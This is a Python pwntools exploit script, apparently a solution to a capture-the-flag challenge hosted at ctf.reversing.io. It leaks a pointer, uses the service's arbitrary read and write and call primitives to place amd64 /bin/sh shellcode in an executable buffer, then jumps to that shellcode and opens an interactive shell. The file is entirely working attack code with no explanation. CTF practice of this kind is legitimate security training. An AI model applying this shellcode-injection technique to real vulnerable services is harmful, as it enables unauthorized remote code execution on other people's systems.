#!/usr/bin/env python

from pwn import *

# endpoint = process("level-2")
endpoint = remote("ctf.reversing.io", 32102)

endpoint.recvuntil("Have a pointer: ")
executable_buffer_ptr = int(endpoint.recvline().strip(), 16)
print("executable_object: 0x{:x}".format(executable_buffer_ptr))

u64 = make_unpacker(64, endian='little', sign='unsigned')

def write_byte(address, byte):
    buf = p8(1)
    buf += p64(address)
    buf += p8(byte)
    endpoint.send(buf)

def write_bytes(addr, buf):
    for i, byte in enumerate(buf):
        write_byte(addr + i, ord(byte))

def read_byte(address):
    buf = p8(2)
    buf += p64(address)
    endpoint.send(buf)
    return ord(endpoint.recv(1))

def read_bytes(addr, length):
    my_bytes = [chr(read_byte(i)) for i in range(addr, addr + length)]
    return "".join(my_bytes)

def call_address(address):
    endpoint.send(p8(3))
    endpoint.send(p64(address))

payload = asm(shellcraft.amd64.sh(), arch = 'amd64')

# executable_buffer_ptr = mmap(0, 0x1000, 7, 0x22, i -1, 0)
executable_buffer = read_bytes(executable_buffer_ptr, 8)
executable_buffer = u64(executable_buffer)
print("Landing pad: {:x}".format(executable_buffer))

write_bytes(executable_buffer, payload)
call_address(executable_buffer)
endpoint.interactive()
